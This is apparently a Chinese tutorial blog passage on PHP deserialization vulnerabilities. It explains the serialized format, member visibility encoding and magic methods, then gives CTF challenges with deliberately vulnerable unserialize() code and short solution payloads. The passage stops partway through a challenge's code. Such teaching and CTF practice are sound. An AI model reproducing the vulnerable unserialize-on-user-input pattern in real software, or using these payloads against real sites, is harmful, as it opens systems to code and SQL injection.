    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><blockquote><p>序列化：持久保存，网络传输</p><p>序列化是将对象状态转换为可保持或可传输的格式的过程（对象转换为字符串）。与序列化相对的是反序列化，它将流转换为对象（字符串转换为对象）。这两个过程结合起来，可以轻松地存储和传输数据</p><p>本质上就是对于数据格式的一种转换</p></blockquote><p><strong>常见的序列化格式：</strong></p><ul><li>二进制格式</li><li>字节数组</li><li>json 字符串</li><li>xml 字符串</li></ul><p><img src="https://i.loli.net/2021/09/15/IWPycor6sQ9nYL7.png" alt="image-20210504114814092"></p><p>理解：在程序执行结束时，内存数据便会立即销毁，变量所储存的数据便是内存数据，而文件、数据库是“持久数据”，因此<strong>PHP序列化就是将内存的变量数据“保存”到文件中的持久数据的过程。</strong></p><h1 id="一、-PHP-反序列化"><a href="#一、-PHP-反序列化" class="headerlink" title="一、 PHP 反序列化"></a>一、 PHP 反序列化</h1><h2 id="1-1-格式"><a href="#1-1-格式" class="headerlink" title="1.1 格式"></a>1.1 格式</h2><p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码注入，SQL注入等危害。</p><p>当进行反序列化的过程中就会自动触发某些魔术方法。</p><p><strong>涉及函数：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">serialize()<span class="comment">//序列化：将一个对象转换为一个字符串</span></span><br><span class="line">unserialize()<span class="comment">//反序列化：将一个字符串还原为一个对象</span></span><br></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;qww&quot;</span>;</span><br><span class="line"><span class="comment">//$test = 123;</span></span><br><span class="line"><span class="comment">//$test = true;</span></span><br><span class="line"><span class="variable">$test</span> = serialize(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//s:3:&quot;qww&quot;;</span></span><br><span class="line"><span class="comment">//i:123;    </span></span><br><span class="line"><span class="comment">//b:1;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&#x27;s:3:&quot;qww&quot;;&#x27;</span>;</span><br><span class="line"><span class="variable">$test</span> = unserialize(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//qww </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$user</span>=array(<span class="string">&#x27;xiao&#x27;</span>,<span class="string">&#x27;shi&#x27;</span>,<span class="string">&#x27;zi&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span>=serialize(<span class="variable">$user</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$user</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">print_r(unserialize(<span class="variable">$user</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/10/qVYPWyw4pl1ITsJ.png" alt="image-20210910165634478"></p><p><strong>格式：</strong></p><p><img src="https://i.loli.net/2021/09/15/3JxYcWU6D2tlKOn.png" alt="image-20210504120450323"></p><p><strong>序列化与反序列化 字母表示：</strong></p><table><thead><tr><th align="center">a</th><th align="center">array数组</th></tr></thead><tbody><tr><td align="center">b</td><td align="center">boolean判断类型</td></tr><tr><td align="center">d</td><td align="center">double浮点数</td></tr><tr><td align="center">i</td><td align="center">integer整数型</td></tr><tr><td align="center">o</td><td align="center">common object 一般的对象</td></tr><tr><td align="center">r</td><td align="center">reference引用类型</td></tr><tr><td align="center">s</td><td align="center">string字符串类型</td></tr><tr><td align="center">C</td><td align="center">custom object</td></tr><tr><td align="center">O</td><td align="center">class</td></tr><tr><td align="center">N</td><td align="center">null</td></tr><tr><td align="center">R</td><td align="center">pointer reference</td></tr><tr><td align="center">U</td><td align="center">unicode string</td></tr></tbody></table><h2 id="1-2-特性"><a href="#1-2-特性" class="headerlink" title="1.2 特性"></a>1.2 特性</h2><ul><li><p><strong>所有 php 中的值都可以使用 serialize()  来返回一个包含字节流的字符串表示</strong></p></li><li><p><strong>序列化之后的内容只有成员变量，没有成员函数，即方法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class <span class="built_in">test</span>&#123;</span><br><span class="line">    public <span class="variable">$a</span>;</span><br><span class="line">    public <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;<span class="variable">$this</span>-&gt;a = <span class="string">&quot;xiaoshizi&quot;</span>;<span class="variable">$this</span>-&gt;b=<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">happy</span></span>()&#123;<span class="built_in">return</span> <span class="variable">$this</span>-&gt;a;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = new <span class="built_in">test</span>();</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/10/NS5xRa8hUD7rvXI.png" alt="image-20210910170119999"></p></li><li><p><strong>三种变量类型的差异：</strong></p><p>变量前是 <strong>protected</strong>，则会在变量名前加上<code>\x00*\x00</code> , <strong>private</strong> 则会在变量名前加上<code>\x00类名\x00</code>，<code>\x00字段名\x00</code>，输出时一般需要url编码，若在本地存储推荐采用base64编码的形式。</p><ul><li><p><strong>public  正常输出</strong></p></li><li><p><strong>Private 所声明的私有变量</strong> 只能在所声明的类中可见，在该类的子类以及该类的对象中均不可见。所以私有变量在序列化时，类名和字段名前面都会加上 <code>%00</code> ，即 ascii 为0的字符（不可见字符）；</p></li><li><p><strong>Protected 所声明受保护类型的变量</strong> 序列化时会有 <code>%00*%00</code> 字符；</p></li></ul><p><strong>测试一：public</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = (serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#返回</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p><strong>测试二：private</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$op</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = (serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#返回</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">15</span>:<span class="string">&quot;FileHandlerop&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">21</span>:<span class="string">&quot;FileHandlerfilename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;FileHandlercontent&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#实际上是</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">15</span>:<span class="string">&quot;%00FileHandler%00op&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">21</span>:<span class="string">&quot;%00FileHandler%00filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;%00FileHandler%00content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p><strong>测试三：protected</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = (serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#返回</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;*op&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;*filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;*content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>实际上是输出导致了不可见字符 <code>\x00</code> 的丢失</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#实际上是</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;%00*%00op&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;%00*%00filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;%00*%00content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="1-3-php-反序列化的触发"><a href="#1-3-php-反序列化的触发" class="headerlink" title="1.3 php 反序列化的触发"></a>1.3 php 反序列化的触发</h2><p><strong>触发条件：</strong></p><p>unserialize() 函数 的变量可控，文件当中存在可利用的类，类中存在魔术方法</p><p><strong>常见魔术方法：魔术方法就是 php 在进行有关类中变量序列化以及反序列化相关操作是会自动被调用的一些方法（函数）</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() <span class="comment">//使用unserialize时触发 </span></span><br><span class="line">__sleep() <span class="comment">//使用serialize时触发 </span></span><br><span class="line">__destruct() <span class="comment">//对象被销毁时触发</span></span><br><span class="line">__call()    <span class="comment">//在对象上下文中调用不可访问的方法时触发——对象调用一个没有声明的方法时，触发 </span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发 </span></span><br><span class="line">__get() <span class="comment">//用于从不可访问的属性读取数据 </span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性 </span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发 </span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString() <span class="comment">//把 一个对象 当作 字符串 使用时触发 </span></span><br><span class="line">    <span class="comment">//例如：echo 对象; $text=$test+$对象； </span></span><br><span class="line">__invoke() <span class="comment">//当尝试以调用函数的方式调用一个对象时，该方法会被自动调用</span></span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php">其它魔术方法</a></p><p>理解魔术方法的调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr1</span>=<span class="string">&quot;abc&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr2</span>=<span class="string">&quot;123&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">echoP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;varr1.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__construct&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__destruct&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;__toString&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__sleep&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;varr1&#x27;</span>,<span class="string">&#x27;varr2&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> test();  <span class="comment">//实例化对象，调用__construct()方法，输出__construct</span></span><br><span class="line"><span class="variable">$obj</span>-&gt;echoP();   <span class="comment">//调用echoP()方法，输出&quot;abc&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>;    <span class="comment">//obj对象被当做字符串输出，调用__toString()方法，输出__toString</span></span><br><span class="line"><span class="variable">$s</span> =serialize(<span class="variable">$obj</span>);  <span class="comment">//obj对象被序列化，调用__sleep()方法，输出__sleep</span></span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="variable">$s</span>);  <span class="comment">//$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。</span></span><br><span class="line"><span class="comment">// 脚本结束又会调用__destruct()方法，输出__destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/10/g1OCJhFiYa7s8yk.png" alt="image-20210910213239299"></p><h2 id="1-4-无类简单题目"><a href="#1-4-无类简单题目" class="headerlink" title="1.4 无类简单题目"></a>1.4 无类简单题目</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;Love&quot;</span>;</span><br><span class="line">    <span class="variable">$str1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(unserialize(<span class="variable">$str1</span>) === <span class="variable">$str</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//WP:?str1=s:4:&quot;Love&quot;;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;ISecer&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(unserialize(<span class="variable">$cookie</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;admin.css&quot;</span> type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">align</span>=&quot;<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">action</span>=&quot;#&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">user</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Username</span>&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Password</span>&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">value</span>=&quot;<span class="title">Login</span>&quot; <span class="title">type</span>=&quot;<span class="title">button</span>&quot;/&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">$<span class="title">KEY</span>=&#x27;<span class="title">ISecer</span>:<span class="title">www</span>.<span class="title">isecer</span>.<span class="title">com</span>&#x27;;</span></span><br><span class="line"><span class="class">?&gt; </span></span><br><span class="line"><span class="class">//<span class="title">WP</span>:<span class="title">cookie</span>:<span class="title">ISecer</span>=<span class="title">s</span>:0:&quot;&quot;;</span></span><br><span class="line"><span class="class">    //顺序问题</span></span><br></pre></td></tr></table></figure><h2 id="1-5-有类简单题目"><a href="#1-5-有类简单题目" class="headerlink" title="1.5 有类简单题目"></a>1.5 有类简单题目</h2><p>触发魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__construct <span class="comment">//创建对象时触发</span></span><br><span class="line">__destruct <span class="comment">//对象被销毁时 触发 使用unserialize时触发</span></span><br><span class="line">__toString <span class="comment">//echo 或者 拼接字符串或者其它隐式调用该方法的操作都会被触发</span></span><br><span class="line">__wakeup() <span class="comment">//使用unserialize时触发 </span></span><br><span class="line">__sleep() <span class="comment">//使用serialize时触发 </span></span><br><span class="line">__call()    <span class="comment">//在对象上下文中调用不可访问的方法时触发——对象调用一个没有声明的方法时，触发 </span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发 </span></span><br><span class="line">__get() <span class="comment">//用于从不可访问的属性读取数据 </span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性 </span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发 </span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString() <span class="comment">//把类当作字符串使用时触发 echo 对象; $text=$test+$对象； </span></span><br><span class="line">__invoke() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure><p>魔术方法参考：<a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></p><h2 id="1-5-CTF-题目"><a href="#1-5-CTF-题目" class="headerlink" title="1.5 CTF 题目"></a>1.5 CTF 题目</h2><h3 id="1-5-1-CTFHUB-AreUSerialz"><a href="#1-5-1-CTFHUB-AreUSerialz" class="headerlink" title="1.5.1 CTFHUB AreUSerialz"></a>1.5.1 CTFHUB AreUSerialz</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 